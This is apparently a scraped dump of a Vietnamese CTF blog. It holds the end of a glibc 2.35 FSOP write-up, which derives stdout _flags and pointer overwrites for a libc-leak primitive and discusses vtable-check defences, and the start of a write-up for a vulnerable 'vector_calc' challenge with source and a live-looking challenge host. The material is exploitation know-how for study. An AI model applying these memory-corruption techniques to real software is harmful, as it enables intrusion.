\u0026amp;\u0026amp; _io_putc_unlocked (\u0026#39;\\n\u0026#39;, stdout) != eof) result = min (int_max, len + 1); _io_release_lock (stdout); return result; } weak_alias (_io_puts, puts) ta thấy trong source và assembly, tiếp tục gọi đến _io_sputn. sau 1 hồi tìm kiếm thì mình biết là _io_sputn là alias tới _io_xsputn (__fp, __s, __n) qua dòng code\n#define _io_sputn(__fp, __s, __n) _io_xsputn (__fp, __s, __n) đơn giản là nó jump thẳng tới con trỏ hàm trong __xsputn với vtable là của stdout fp.\n#define _io_xsputn(fp, data, n) jump2 (__xsputn, fp, data, n) kiểm tra vtable của stdout trong gdb, ta thấy __xsputn trỏ đến _io_new_file_xsputn.\npwndbg\u0026gt; print _io_file_jumps $3 = { __dummy = 0, __dummy2 = 0, __finish = 0x7ffff7c86060 \u0026lt;_io_new_file_finish\u0026gt;, __overflow = 0x7ffff7c86e60 \u0026lt;_io_new_file_overflow\u0026gt;, __underflow = 0x7ffff7c86af0 \u0026lt;_io_new_file_underflow\u0026gt;, __uflow = 0x7ffff7c88100 \u0026lt;__gi__io_default_uflow\u0026gt;, __pbackfail = 0x7ffff7c898c0 \u0026lt;__gi__io_default_pbackfail\u0026gt;, __xsputn = 0x7ffff7c856b0 \u0026lt;_io_new_file_xsputn\u0026gt; # target __xsgetn = 0x7ffff7c85340 \u0026lt;__gi__io_file_xsgetn\u0026gt;, __seekoff = 0x7ffff7c849a0 \u0026lt;_io_new_file_seekoff\u0026gt;, __seekpos = 0x7ffff7c88840 \u0026lt;_io_default_seekpos\u0026gt;, __setbuf = 0x7ffff7c84650 \u0026lt;_io_new_file_setbuf\u0026gt;, __sync = 0x7ffff7c844e0 \u0026lt;_io_new_file_sync\u0026gt;, __doallocate = 0x7ffff7c78060 \u0026lt;__gi__io_file_doallocate\u0026gt;, __read = 0x7ffff7c859d0 \u0026lt;__gi__io_file_read\u0026gt;, __write = 0x7ffff7c84f80 \u0026lt;_io_new_file_write\u0026gt;, __seek = 0x7ffff7c84720 \u0026lt;__gi__io_file_seek\u0026gt;, __close = 0x7ffff7c84640 \u0026lt;__gi__io_file_close\u0026gt;, __stat = 0x7ffff7c84f70 \u0026lt;__gi__io_file_stat\u0026gt;, __showmanyc = 0x7ffff7c89a40 \u0026lt;_io_default_showmanyc\u0026gt;, __imbue = 0x7ffff7c89a50 \u0026lt;_io_default_imbue\u0026gt; } vậy ta cùng xem source hàm _io_new_file_xsputn _io_new_file_xsputn\nsize_t _io_new_file_xsputn (file *f, const void *data, size_t n) { const char *s = (const char *) data; size_t to_do = n; int must_flush = 0; size_t count = 0; if (n \u0026lt;= 0) return 0; /* this is an optimized implementation. if the amount to be written straddles a block boundary (or the filebuf is unbuffered), use sys_write directly. */ /* first figure out how much space is available in the buffer. */ if ((f-\u0026gt;_flags \u0026amp; _io_line_buf) \u0026amp;\u0026amp; (f-\u0026gt;_flags \u0026amp; _io_currently_putting)) { count = f-\u0026gt;_io_buf_end - f-\u0026gt;_io_write_ptr; if (count \u0026gt;= n) { const char *p; for (p = s + n; p \u0026gt; s; ) { if (*--p == \u0026#39;\\n\u0026#39;) { count = p - s + 1; must_flush = 1; break; } } } } else if (f-\u0026gt;_io_write_end \u0026gt; f-\u0026gt;_io_write_ptr) count = f-\u0026gt;_io_write_end - f-\u0026gt;_io_write_ptr; /* space available. */ /* then fill the buffer. */ if (count \u0026gt; 0) { if (count \u0026gt; to_do) count = to_do; f-\u0026gt;_io_write_ptr = __mempcpy (f-\u0026gt;_io_write_ptr, s, count); s += count; to_do -= count; } if (to_do + must_flush \u0026gt; 0) { size_t block_size, do_write; /* next flush the (full) buffer. */ if (_io_overflow (f, eof) == eof) /* if nothing else has to be written we must not signal the caller that everything has been written. */ return to_do == 0 ? eof : n - to_do; /* try to maintain alignment: write a whole number of blocks. */ block_size = f-\u0026gt;_io_buf_end - f-\u0026gt;_io_buf_base; do_write = to_do - (block_size \u0026gt;= 128 ? to_do % block_size : 0); if (do_write) { count = new_do_write (f, s, do_write); to_do -= count; if (count \u0026lt; do_write) return n - to_do; } /* now write out the remainder. normally, this will fit in the buffer, but it\u0026#39;s somewhat messier for line-buffered files, so we let _io_default_xsputn handle the general case. */ if (to_do) to_do -= _io_default_xsputn (f, s+do_write, to_do); } return n - to_do; } libc_hidden_ver (_io_new_file_xsputn, _io_file_xsputn) trước khi gọi đến hàm new_do_write(), ta để ý ở trên gọi đến _io_overflow().\nvào hàm _io_overflow() thì trong vtable của stdout, nó gọi đến hàm _io_new_file_overflow()\n_io_new_file_overflow\nint _io_new_file_overflow (file *f, int ch) { if (f-\u0026gt;_flags \u0026amp; _io_no_writes) /* set error */ { f-\u0026gt;_flags |= _io_err_seen; __set_errno (ebadf); return eof; } /* if currently reading or no buffer allocated. */ if ((f-\u0026gt;_flags \u0026amp; _io_currently_putting) == 0 || f-\u0026gt;_io_write_base == null) { /* allocate a buffer if needed. */ if (f-\u0026gt;_io_write_base == null) { _io_doallocbuf (f); _io_setg (f, f-\u0026gt;_io_buf_base, f-\u0026gt;_io_buf_base, f-\u0026gt;_io_buf_base); } /* otherwise must be currently reading. if _io_read_ptr (and hence also _io_read_end) is at the buffer end, logically slide the buffer forwards one block (by setting the read pointers to all point at the beginning of the block). this makes room for subsequent output. otherwise, set the read pointers to _io_read_end (leaving that alone, so it can continue to correspond to the external position). */ if (__glibc_unlikely (_io_in_backup (f))) { size_t nbackup = f-\u0026gt;_io_read_end - f-\u0026gt;_io_read_ptr; _io_free_backup_area (f); f-\u0026gt;_io_read_base -= min (nbackup, f-\u0026gt;_io_read_base - f-\u0026gt;_io_buf_base); f-\u0026gt;_io_read_ptr = f-\u0026gt;_io_read_base; } if (f-\u0026gt;_io_read_ptr == f-\u0026gt;_io_buf_end) f-\u0026gt;_io_read_end = f-\u0026gt;_io_read_ptr = f-\u0026gt;_io_buf_base; f-\u0026gt;_io_write_ptr = f-\u0026gt;_io_read_ptr; f-\u0026gt;_io_write_base = f-\u0026gt;_io_write_ptr; f-\u0026gt;_io_write_end = f-\u0026gt;_io_buf_end; f-\u0026gt;_io_read_base = f-\u0026gt;_io_read_ptr = f-\u0026gt;_io_read_end; f-\u0026gt;_flags |= _io_currently_putting; if (f-\u0026gt;_mode \u0026lt;= 0 \u0026amp;\u0026amp; f-\u0026gt;_flags \u0026amp; (_io_line_buf | _io_unbuffered)) f-\u0026gt;_io_write_end = f-\u0026gt;_io_write_ptr; } if (ch == eof) return _io_do_write (f, f-\u0026gt;_io_write_base, f-\u0026gt;_io_write_ptr - f-\u0026gt;_io_write_base); if (f-\u0026gt;_io_write_ptr == f-\u0026gt;_io_buf_end ) /* buffer is really full */ if (_io_do_flush (f) == eof) return eof; *f-\u0026gt;_io_write_ptr++ = ch; if ((f-\u0026gt;_flags \u0026amp; _io_unbuffered) || ((f-\u0026gt;_flags \u0026amp; _io_line_buf) \u0026amp;\u0026amp; ch == \u0026#39;\\n\u0026#39;)) if (_io_do_write (f, f-\u0026gt;_io_write_base, f-\u0026gt;_io_write_ptr - f-\u0026gt;_io_write_base) == eof) return eof; return (unsigned char) ch; } libc_hidden_ver (_io_new_file_overflow, _io_file_overflow) lưu ý rằng, tham số thứ 2 đang lưu giá trị eof (ch == eof).\nif (ch == eof) return _io_do_write (f, f-\u0026gt;_io_write_base, f-\u0026gt;_io_write_ptr - f-\u0026gt;_io_write_base); _io_do_write() là hàm cuối cùng được gọi và nó là alias tới _io_new_do_write()\n_io_new_do_write\nstatic size_t new_do_write (file *fp, const char *data, size_t to_do) { size_t count; if (fp-\u0026gt;_flags \u0026amp; _io_is_appending) /* on a system without a proper o_append implementation, you would need to sys_seek(0, seek_end) here, but is not needed nor desirable for unix- or posix-like systems. instead, just indicate that offset (before and after) is unpredictable. */ fp-\u0026gt;_offset = _io_pos_bad; else if (fp-\u0026gt;_io_read_end != fp-\u0026gt;_io_write_base) { off64_t new_pos = _io_sysseek (fp, fp-\u0026gt;_io_write_base - fp-\u0026gt;_io_read_end, 1); if (new_pos == _io_pos_bad) return 0; fp-\u0026gt;_offset = new_pos; } count = _io_syswrite (fp, data, to_do); if (fp-\u0026gt;_cur_column \u0026amp;\u0026amp; count) fp-\u0026gt;_cur_column = _io_adjust_column (fp-\u0026gt;_cur_column - 1, data, count) + 1; _io_setg (fp, fp-\u0026gt;_io_buf_base, fp-\u0026gt;_io_buf_base, fp-\u0026gt;_io_buf_base); fp-\u0026gt;_io_write_base = fp-\u0026gt;_io_write_ptr = fp-\u0026gt;_io_buf_base; fp-\u0026gt;_io_write_end = (fp-\u0026gt;_mode \u0026lt;= 0 \u0026amp;\u0026amp; (fp-\u0026gt;_flags \u0026amp; (_io_line_buf | _io_unbuffered)) ? fp-\u0026gt;_io_buf_base : fp-\u0026gt;_io_buf_end); return count; } cuối cùng trong hàm _io_new_do_write() nó gọi tới _io_syswrite (fp, data, to_do).\n_io_syswrite trỏ tới key __write trong vtable.\n#define _io_syswrite(fp, data, len) jump2 (__write, fp, data, len) #__write = 0x7ffff7c84f80 \u0026lt;_io_new_file_write\u0026gt; _io_new_file_write\nssize_t _io_new_file_write (file *f, const void *data, ssize_t n) { ssize_t to_do = n; while (to_do \u0026gt; 0) { ssize_t count = (__builtin_expect (f-\u0026gt;_flags2 \u0026amp; _io_flags2_notcancel, 0) ? __write_nocancel (f-\u0026gt;_fileno, data, to_do) : __write (f-\u0026gt;_fileno, data, to_do)); -\u0026gt; target if (count \u0026lt; 0) { f-\u0026gt;_flags |= _io_err_seen; break; } to_do -= count; data = (void *) ((char *) data + count); } n -= to_do; if (f-\u0026gt;_offset \u0026gt;= 0) f-\u0026gt;_offset += n; return n; } rõ ràng ta thấy, cuối cùng nó sẽ gọi syscall write() để thực hiện in ra màn hình ?\n__write (f-\u0026gt;_fileno, data, to_do) mình tóm tắt flow của hàm puts() thành 1 sơ đồ sau:\nputs(str) |_ _io_new_file_xsputn (stdout, str, len) |_ _io_new_file_overflow (stdout, eof) |_ new_do_write(stdout, stdout-\u0026gt;_io_write_base, stdout-\u0026gt;_io_write_ptr - stdout-\u0026gt;_io_write_base) |_ _io_new_file_write(stdout, stdout-\u0026gt;_io_write_base, stdout-\u0026gt;_io_write_ptr - stdout-\u0026gt;_io_write_base) |_ write(stdout-\u0026gt;fileno, stdout-\u0026gt;_io_write_base, stdout-\u0026gt;_io_write_ptr - stdout-\u0026gt;_io_write_base) -\u0026gt; mọi thứ đã rõ ràng rồi, mục tiêu của chúng ta là làm sao để thực hiện được write(stdout-\u0026gt;fileno, stdout-\u0026gt;_io_write_base, stdout-\u0026gt;_io_write_ptr - stdout-\u0026gt;_io_write_base). việc cần làm đầu tiên là ta phải bypass được 1 loạt check đồ sộ ở trên.\nlúc gọi đến syscall write, mình kiểm tra giá trị của từng biến trong write. mình đặt break points ngay hàm write và lần lượt kiểm tra\npwndbg\u0026gt; p _io_2_1_stdout_ $1 = { file = { _flags = -72537468, _io_read_ptr = 0x5555555592a0 \u0026#34;fsop attack\\n\u0026#34;, _io_read_end = 0x5555555592a0 \u0026#34;fsop attack\\n\u0026#34;, _io_read_base = 0x5555555592a0 \u0026#34;fsop attack\\n\u0026#34;, _io_write_base = 0x5555555592a0 \u0026#34;fsop attack\\n\u0026#34;, _io_write_ptr = 0x5555555592ac \u0026#34;\u0026#34;, _io_write_end = 0x5555555592a0 \u0026#34;fsop attack\\n\u0026#34;, _io_buf_base = 0x5555555592a0 \u0026#34;fsop attack\\n\u0026#34;, _io_buf_end = 0x5555555596a0 \u0026#34;\u0026#34;, _io_save_base = 0x0, _io_backup_base = 0x0, _io_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7df6aa0 \u0026lt;_io_2_1_stdin_\u0026gt;, _fileno = 1, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 \u0026#39;\\000\u0026#39;, _shortbuf = \u0026#34;\u0026#34;, _lock = 0x7ffff7df8a30 \u0026lt;_io_stdfile_1_lock\u0026gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7df69a0 \u0026lt;_io_wide_data_1\u0026gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = \u0026#39;\\000\u0026#39; \u0026lt;repeats 19 times\u0026gt; }, vtable = 0x7ffff7df3600 \u0026lt;_io_file_jumps\u0026gt; } lúc này: stdout-\u0026gt;fileno = 1 stdout-\u0026gt;_io_write_ptr = 0x5555555592ac stdout-\u0026gt;_io_write_base = 0x5555555592a0 \u0026quot;fsop attack\\n\u0026quot;\ngiá trị stdout-\u0026gt;_io_write_ptr - stdout-\u0026gt;_io_write_base đúng bằng 12, bằng độ dài của chuỗi mà chúng ta muốn in.\n1 suy nghĩ hiện lên, nếu ta có thể ghi đè những giá trị này ? có nghĩa là ta sẽ điều khiển nó in cái gì mà ta muốn :\u0026gt;. khi đó chúng ta không cần phải quan ngại điều gì cả khi đã có địa chỉ libc\u0026hellip; hơn thế nữa là stack, pie, \u0026hellip;..\nnhưng đời không như là mơ, sự thật nỗ não , chúng ta bắt buộc phải bypass tất cả các điều kiện ở trên nếu chúng ta muốn có read primitive.\ncác macro được define như sau:\n#define _io_magic 0xfbad0000 /* magic number */ #define _old_stdio_magic 0xfabc0000 /* emulate old stdio. */ #define _io_magic_mask 0xffff0000 #define _io_user_buf 1 /* user owns buffer; don\u0026#39;t delete it on close. */ #define _io_unbuffered 2 #define _io_no_reads 4 /* reading not allowed */ #define _io_no_writes 8 /* writing not allowd */ #define _io_eof_seen 0x10 #define _io_err_seen 0x20 #define _io_delete_dont_close 0x40 /* don\u0026#39;t call close(_fileno) on cleanup. */ #define _io_linked 0x80 /* set if linked (using _chain) to streambuf::_list_all.*/ #define _io_in_backup 0x100 #define _io_line_buf 0x200 #define _io_tied_put_get 0x400 /* set if put and get pointer logicly tied. */ #define _io_currently_putting 0x800 #define _io_is_appending 0x1000 #define _io_is_filebuf 0x2000 #define _io_bad_seen 0x4000 #define _io_user_lock 0x8000 lần lượt đọc source và đi qua từng hàm để xem có thể khai thác được gì không:\nđể thực hiện được _io_do_write() thì mình lần lượt check từng câu lệnh if trong _io_new_file_overflow()\nif (f-\u0026gt;_flags \u0026amp; _io_no_writes) /* set error */ { f-\u0026gt;_flags |= _io_err_seen; __set_errno (ebadf); return eof; } rõ ràng f-\u0026gt;_flags \u0026amp; _io_no_writes buộc phải trả về false thì mới thực hiện tiếp được.\n0x7ffff7c86e64 \u0026lt;_io_file_overflow+4\u0026gt; push r12 0x7ffff7c86e66 \u0026lt;_io_file_overflow+6\u0026gt; push rbp 0x7ffff7c86e67 \u0026lt;_io_file_overflow+7\u0026gt; push rbx 0x7ffff7c86e68 \u0026lt;_io_file_overflow+8\u0026gt; mov eax, dword ptr [rdi] 0x7ffff7c86e6a \u0026lt;_io_file_overflow+10\u0026gt; mov rbx, rdi ► 0x7ffff7c86e6d \u0026lt;_io_file_overflow+13\u0026gt; test al, 8 _io_no_writes = 8 nên stdout-\u0026gt;_flags \u0026amp; 8 = 0\nstdout-\u0026gt;_flags \u0026amp; 8 = 0 tiếp tục check tiếp, chúng ta phải khiến nó sao cho trả về false\nif ((f-\u0026gt;_flags \u0026amp; _io_currently_putting) == 0 || f-\u0026gt;_io_write_base == null) { /* allocate a buffer if needed. */ if (f-\u0026gt;_io_write_base == null) { _io_doallocbuf (f); _io_setg (f, f-\u0026gt;_io_buf_base, f-\u0026gt;_io_buf_base, f-\u0026gt;_io_buf_base); } có nghĩa f-\u0026gt;_flags \u0026amp; _io_currently_putting != 0\nkiểm tra giá trị _io_currently_putting trong gdb:\n0x7ffff7c86e75 \u0026lt;_io_file_overflow+21\u0026gt; mov ebp, esi 0x7ffff7c86e77 \u0026lt;_io_file_overflow+23\u0026gt; mov rsi, qword ptr [rdi + 0x20] ► 0x7ffff7c86e7b \u0026lt;_io_file_overflow+27\u0026gt; test ah, 8 như vậy f-\u0026gt;_flags \u0026amp; 8 = 1 || f-\u0026gt;_io_write_base == null -\u0026gt; false\nf-\u0026gt;_flags \u0026amp; 0x0800 = 1 giả sử, chúng ta đã bypass qua 2 lần check đó ta đã lưu ý ch vẫn bằng eof nên có thể thành công vào hàm _io_do_write()\nif (ch == eof) return _io_do_write (f, f-\u0026gt;_io_write_base, f-\u0026gt;_io_write_ptr - f-\u0026gt;_io_write_base); _io_do_write() gọi tới _io_new_do_write\nstatic size_t new_do_write (file *fp, const char *data, size_t to_do) { size_t count; if (fp-\u0026gt;_flags \u0026amp; _io_is_appending) /* on a system without a proper o_append implementation, you would need to sys_seek(0, seek_end) here, but is not needed nor desirable for unix- or posix-like systems. instead, just indicate that offset (before and after) is unpredictable. */ fp-\u0026gt;_offset = _io_pos_bad; else if (fp-\u0026gt;_io_read_end != fp-\u0026gt;_io_write_base) { off64_t new_pos = _io_sysseek (fp, fp-\u0026gt;_io_write_base - fp-\u0026gt;_io_read_end, 1); if (new_pos == _io_pos_bad) return 0; fp-\u0026gt;_offset = new_pos; } count = _io_syswrite (fp, data, to_do); if (fp-\u0026gt;_cur_column \u0026amp;\u0026amp; count) fp-\u0026gt;_cur_column = _io_adjust_column (fp-\u0026gt;_cur_column - 1, data, count) + 1; _io_setg (fp, fp-\u0026gt;_io_buf_base, fp-\u0026gt;_io_buf_base, fp-\u0026gt;_io_buf_base); fp-\u0026gt;_io_write_base = fp-\u0026gt;_io_write_ptr = fp-\u0026gt;_io_buf_base; fp-\u0026gt;_io_write_end = (fp-\u0026gt;_mode \u0026lt;= 0 \u0026amp;\u0026amp; (fp-\u0026gt;_flags \u0026amp; (_io_line_buf | _io_unbuffered)) ? fp-\u0026gt;_io_buf_base : fp-\u0026gt;_io_buf_end); return count; } fp-\u0026gt;_flags \u0026amp; _io_is_appending cần phải trả về true để không bị vướng vào câu lệnh if hỗn độn ngay dưới nó :\u0026gt;\nnếu không thõa mãn điều kiện này thì ta thử đi vào câu lệnh nhánh if phía dưới:\nif (fp-\u0026gt;_io_read_end != fp-\u0026gt;_io_write_base) { off64_t new_pos = _io_sysseek (fp, fp-\u0026gt;_io_write_base - fp-\u0026gt;_io_read_end, 1); if (new_pos == _io_pos_bad) return 0; fp-\u0026gt;_offset = new_pos; } so sánh giá trị fp-\u0026gt;_io_read_end và fp-\u0026gt;_io_write_base nếu khác nhau, sẽ gọi hàm _io_sysseek(). bởi vì giá trị của fp-\u0026gt;_io_read_end và fp-\u0026gt;_io_write_base đang bằng nhau nên có thể dễ dàng bypass được kiện check. đi sâu vào bên trong, _io_sysseek() sẽ gọi syscall lseek() với tham số là offset=fp-\u0026gt;_io_write_base - fp-\u0026gt;_io_read_end. vì vậy, nếu fp-\u0026gt;_io_write_base \u0026lt; fp-\u0026gt;_io_read_end thì offset sẽ có giá trị âm và làm cho chương trình báo lỗi. như vậy, để nó không xảy ra thì ta chỉ cần overwrite lsb của fp-\u0026gt;_io_write_base thành null byte, nhưng muốn chắc thì ta cũng overwrite lsb củafp-\u0026gt;_io_write_base thành null.\nfp-\u0026gt;_flags \u0026amp; _io_is_appending = 1\n0x7ffff7c8699d \u0026lt;_io_do_write+45\u0026gt; mov rbp, rdx 0x7ffff7c869a0 \u0026lt;_io_do_write+48\u0026gt; push rbx 0x7ffff7c869a1 \u0026lt;_io_do_write+49\u0026gt; mov rbx, rdi 0x7ffff7c869a4 \u0026lt;_io_do_write+52\u0026gt; sub rsp, 8 0x7ffff7c869a8 \u0026lt;_io_do_write+56\u0026gt; mov r14, qword ptr [rdi + 0xd8] ► 0x7ffff7c869af \u0026lt;_io_do_write+63\u0026gt; test dword ptr [rdi], 0x1000 \u0026lt;_io_2_1_stdout_\u0026gt; 0x7ffff7c869b5 \u0026lt;_io_do_write+69\u0026gt; jne _io_do_write+272 \u0026lt;_io_do_write+272\u0026gt; _io_is_appending = 0x1000\nfp-\u0026gt;_flags \u0026amp; 0x1000 == 1 vậy, tổng kết như sau:\nstdout-\u0026gt;_flags \u0026amp; _io_no_writes == 0 stdout-\u0026gt;_flags \u0026amp; _io_currently_putting == 1 stdout-\u0026gt;_flags \u0026amp; _io_is_appending == 1 _flags \u0026amp; 0x8 = 0 _flags \u0026amp; 0x800 = 1 _flags \u0026amp; 0x1000 = 1 -\u0026gt; _flags = 0x1800\ntương tự với read primitive, write primitive cũng cần 1 số điều kiện để chúng có thể hoạt động, chỉ cần chúng ta điều khiển được các giá trị _io_read_end, _io_read_ptr,\u0026hellip; là được. vậy, chúng ta đã thành công bypass được tất cả các hạn chế và chỉ cần ghi vào f-\u0026gt;_io_write_ptr , f-\u0026gt;_io_write_base những giá trị phù hợp để khai thác, ta sẽ có được libc base , khi đã có libc base, ta có thể tiếp tục dùng fsop để điều khiển được luồng thực thi nhờ vtable hijacking như phần trên mình đã nói (và rõ ràng là ở glibc-2.35 thì gần như đã full đồ, full giáp nên việc tấn công fsop rất là khó và phải cần rất nhiều kiến thức và hiểu rõ bản chất để có thể đi sâu hơn trong kĩ thuật này) !\n4. vtable-hijacking ta đã thành công giải quyết được vấn đề read/write primitive trên glibc-2.35, làm sao ta có thể điều khiển được luồng thực thi từ chương trình nếu như không thể bypass được loạt check trên.\n5. protection mechanism từ phiên bản glibc-2.24 trở đi, khi ta ghi đè vào vtable thì sẽ không còn chiếm quyền điều khiển được nữa. bởi vì chương trình sẽ kiểm tra tính hợp lệ của địa chỉ vtable trước khi gọi hàm ảo.\nhai hàm io_validate_vtable and _io_vtable_check được thêm vào.\nstatic inline const struct _io_jump_t * io_validate_vtable (const struct _io_jump_t *vtable) { /* fast path: the vtable pointer is within the __libc_io_vtables section. */ uintptr_t section_length = __stop___libc_io_vtables - __start___libc_io_vtables; const char *ptr = (const char *) vtable; uintptr_t offset = ptr - __start___libc_io_vtables; if (__glibc_unlikely (offset \u0026gt;= section_length)) /* the vtable pointer is not in the expected section. use the slow path, which will terminate the process if necessary. */ _io_vtable_check (); return vtable; } hàm kiểm tra xem con trỏ vtable có nằm trong phần __libc_io_vtables hay không. nếu không, nó sẽ tiếp tục gọi đến _io_vtable_check .\nvoid attribute_hidden _io_vtable_check (void) { #ifdef shared void (*flag) (void) = atomic_load_relaxed (\u0026amp;io_accept_foreign_vtables); #ifdef ptr_demangle ptr_demangle (flag); #endif if (flag == \u0026amp;_io_vtable_check) return; { dl_info di; struct link_map *l; if (_dl_open_hook != null || (_dl_addr (_io_vtable_check, \u0026amp;di, \u0026amp;l, null) != 0 \u0026amp;\u0026amp; l-\u0026gt;l_ns != lm_id_base)) return; } #else /* !shared */ if (__dlopen != null) return; #endif __libc_fatal (\u0026#34;fatal error: glibc detected an invalid stdio handle\\n\u0026#34;); } nếu vtable không hợp lệ, chương trình sẽ dừng lại và báo lỗi.\nreferences https://chovid99.github.io/posts/file-structure-attack-part-1/ https://dhavalkapil.com/blogs/file-structure-exploitation/ https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%e6%90%ac%e8%bf%90/ https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/ https://en.wikipedia.org/wiki/virtual_method_table https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/ https://blog.kylebot.net/2022/10/22/angry-fsrop/ https://bbs.kanxue.com/thread-273832.htm\n","title":"FILE STREAM ORIENTED PROGRAMMING"},{"date":"2023-08-01","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/posts/w1_test/","summary":"Writeup","tags":["ctf","pwn"],"text":"tuần vừa rồi mình có tham gia giải mini-ctf về 3 mảng (web, forensics, crypto) của clb w1, nhưng thật không may, vì không chuyên vào các mảng này và cũng không tiếp xúc nhiều nên mình chỉ làm được 1 ít và dừng chân ở top 11 (khá là tiếc vì chỉ còn 1 chút nữa là mình đã pass kì test). tuy nhiên, qua bài test đó, mình đã học rất nhiều thứ bổ ích. tuần này quay trở lại bài test về binary (gồm pwn và reverse), bài test gồm 2 bài pwn và 5 bài reverse, mình đã hoàn thành 6/7 bài, và thật tiếc khi không đủ time để làm bài cuối\nmình xin trình bày một số bài mà mình đã làm được\npwn 1. vector_calc host: nc 45.122.249.68 20017\ndescription: my vector calculator is complete. however, i feel something is not right about this program. can you find it?\nchall file: bin, src\nchall.c\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define max_faves 4 #define max_vectors 3 struct vector{ __uint64_t x; __uint64_t y; void (*printfunc)(struct vector*); }; struct vector v_list[max_vectors]; __uint64_t* sum; void* faves[max_faves]; void printdata(struct vector* v); void enterdata(){ struct vector* v; __uint64_t idx; printf(\u0026#34;index: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;idx); if(idx \u0026gt; max_vectors){ puts(\u0026#34;invaild index!\u0026#34;); exit(-1); } v = \u0026amp;v_list[idx]; v-\u0026gt;printfunc = printdata; printf(\u0026#34;enter x: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;v-\u0026gt;x); printf(\u0026#34;enter y: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;v-\u0026gt;y); } void printdata(struct vector* v){ puts(\u0026#34;data: \u0026#34;); printf(\u0026#34;v = [%lu %lu]\\n\u0026#34;,v-\u0026gt;x,v-\u0026gt;y); } void sumvector(){ __uint64_t idx; printf(\u0026#34;save the sum to index: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;idx); if(idx \u0026gt; max_vectors){ puts(\u0026#34;invaild index!\u0026#34;); exit(-1); } sum = \u0026amp;v_list[idx]; for(__uint64_t i = 0 ; i \u0026lt; max_vectors ;++i){ if( i != idx){ ((struct vector *)sum)-\u0026gt;x += v_list[idx].x; ((struct vector *)sum)-\u0026gt;y += v_list[idx].y; } } } void loadfavorite(){ if(sum == null){ puts(\u0026#34;you must set the sum before!\u0026#34;); return; } __uint64_t idx; printf(\u0026#34;index: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;idx); if(idx \u0026gt;= max_faves){ puts(\u0026#34;invaild index!\u0026#34;); exit(-1); } faves[idx] = malloc(sizeof(struct vector)); ((struct vector *)faves[idx])-\u0026gt;printfunc = printdata; memcpy(faves[idx],\u0026amp;sum[idx], sizeof(struct vector)); } void printfavorite(){ if(sum == null){ puts(\u0026#34;you must set the sum before!\u0026#34;); return; } __uint64_t idx; printf(\u0026#34;index: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;idx); if(idx \u0026gt;= max_faves || faves[idx] == null){ puts(\u0026#34;invaild index!\u0026#34;); exit(-1); } if( ((__uint64_t *)faves[idx])[2] ) ((struct vector *)faves[idx])-\u0026gt;printfunc(faves[idx]); else ((struct vector *)sum)-\u0026gt;printfunc(faves[idx]); } void addfavorute(){ __uint64_t idx; printf(\u0026#34;index: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;,\u0026amp;idx); if(idx \u0026gt;= max_faves || faves[idx] == null){ puts(\u0026#34;invaild index!\u0026#34;); exit(-1); } ((struct vector *)sum)-\u0026gt;x += ((struct vector *)faves[idx])-\u0026gt;x; ((struct vector *)sum)-\u0026gt;y += ((struct vector *)faves[idx])-\u0026gt;y; } void init(){ setbuf(stdin,null); setbuf(stdout,null); for(__uint64_t i = 0 ; i \u0026lt; max_vectors ;++i){ v_list[i].printfunc = printdata; } } void printmenu(){ printf( \u0026#34;\\r\\n\u0026#34; \u0026#34;1. enter data.\\n\u0026#34; \u0026#34;2. sum vector.\\n\u0026#34; \u0026#34;3. print sum vector\\n\u0026#34; \u0026#34;4. save sum to favorite\\n\u0026#34; \u0026#34;5. print favorite\\n\u0026#34; \u0026#34;6. add favorite to the sum\\n\u0026#34; \u0026#34;\u0026gt; \u0026#34; ); } int main(int argc, char** argv, char** envp){ init(); __uint32_t choice ; while(1){ printmenu(); scanf(\u0026#34;%u\u0026#34;, \u0026amp;choice); switch (choice) { case 1: enterdata(); break; case 2: sumvector(); break; case 3: ((struct vector *)sum)-\u0026gt;printfunc(sum); break; case 4: loadfavorite(); break; case 5: printfavorite(); break; case 6: addfavorute(); break; default: puts(\u0026#34;invaild option!\u0026#34;); exit(-1); } } } void w1n(); // try to view the code in a disassembler :) ban đầu, dùng checksec() để kiểm tra các chế độ bảo vệ của file:\n─   ~/ctf/wannagame/calc ✘ int  31m 0s  03:54:35 ─╮ ╰─❯ checksec chall ─╯ [*] \u0026#39;/home/w1n-gl0ry/ctf/wannagame/calc/chall\u0026#39; arch: amd64-64-little relro: full relro stack: canary found nx: nx enabled pie: pie enabled :oops: , full chế độ được bật :\u0026raquo;\u0026raquo;\nnhìn sơ qua thì ta thấy chương trình khai báo 1 struct vector có dạng gồm 2 số nguyên không dấu và 1 con trỏ đến hàm nhận tham số kiểu (struct vector*)\nstruct vector{ __uint64_t x; __uint64_t y; void (*printfunc)(struct vector*); }; tiếp tục, mảng v_list chứa tối đa 3 phần tử kiểu vector, biến con trỏ sum và mảng chứa tối đa 4 con trỏ faves\nđến đây thì chưa có gì rõ ràng, ta tiếp tục vào các chức năng chính của chương trình, ta có thể khái quát lại như sau:\nhàm enterdata(): nhập vào index muốn mà mình muốn nhập các chỉ số x, y của struct v , nếu index \u0026gt; 3 -\u0026gt; exit hàm printdata(): dùng để in ra màn hình 2 chỉ số x, y của struct hàm sumvector(): dùng để lưu tổng tất cả các chỉ số x, y (không bao gồm chỉ số của index được chọn), index được chọn sẽ là nơi để lưu tổng của các chỉ số x, y hàm loadfavorite(): nhập vào index của struct mà ta muốn lưu trên heap bằng cách gọi malloc(sizeof(struct vector)) rồi lưu địa chỉ trên mảng con trỏ faves[index] đã được khai báo đầu chương trình hàm printfavorite(): in ra 2 chỉ số x,y trên heap vừa lưu hàm addfavorute(): cộng vào 2 chỉ số x, 